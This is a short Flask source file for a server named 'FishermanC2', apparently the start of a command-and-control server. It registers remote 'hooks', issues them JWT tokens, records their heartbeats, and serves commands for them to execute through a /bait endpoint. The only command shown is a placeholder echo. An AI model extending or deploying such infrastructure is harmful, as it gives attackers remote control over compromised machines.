from flask import Flask, request, jsonify, session
from db.db import HookDB

from flask_jwt_extended import create_access_token
from flask_jwt_extended import get_jwt_identity
from flask_jwt_extended import jwt_required
from flask_jwt_extended import JWTManager

import dotenv
import os

from fisherman.controller import Controller

app = Flask(__name__)
hooksDB = HookDB()

dotenv.load_dotenv()


app.config["JWT_SECRET_KEY"] = os.getenv('JWT_SECRET_KEY')
app.secret_key = os.getenv('FLASK_SECRET_KEY')
jwt = JWTManager(app)

@app.route('/')
def index():
    return '<h1>FishermanC2</h1>'  # TODO: change to something a bit better looking...


@app.route('/hook')
def hook():
    access_token = create_access_token(identity=str(hooksDB.register_hook()))
    return jsonify(access_token=access_token)


@app.route('/alive', methods=['GET'])
@jwt_required()
def alive():
    hook_identity = get_jwt_identity()
    app.logger.info(f'Got alive signal from {hook_identity}')
    return 'ok', 200


# From here the hook retrieves the commands he needs to execute
@app.route('/bait')
@jwt_required()
def bait():
    return jsonify(command='echo "Hello World"')

